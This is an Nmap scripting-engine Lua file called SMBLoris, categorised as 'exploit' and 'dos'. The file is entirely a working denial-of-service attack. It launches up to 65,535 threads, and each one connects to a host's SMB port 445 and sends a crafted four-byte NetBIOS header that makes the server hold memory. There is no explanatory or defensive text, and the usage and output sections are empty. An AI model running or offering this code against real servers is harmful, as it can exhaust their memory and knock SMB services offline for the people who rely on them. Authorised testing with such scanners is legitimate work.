local nmap = require "nmap"
local smb = require "smb"
local stdnse = require "stdnse"

description = [[
SMBLoris
]]
---
--@usage
--
--@output
--
-- @xmloutput

author = "Paulino Calderon"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "dos"}

hostrule = function(host)
  return smb.get_port(host) ~= nil
end

local function send_dos(host)
  local s = nmap.new_socket()
  s:connect(host.ip, 445)
  s:send("\x00\x01\xff\xff")
  local status, data = s:receive()
end

action = function(host, port)
  for i=1,65535 do
    local co = stdnse.new_thread(send_dos, host)
  end
end




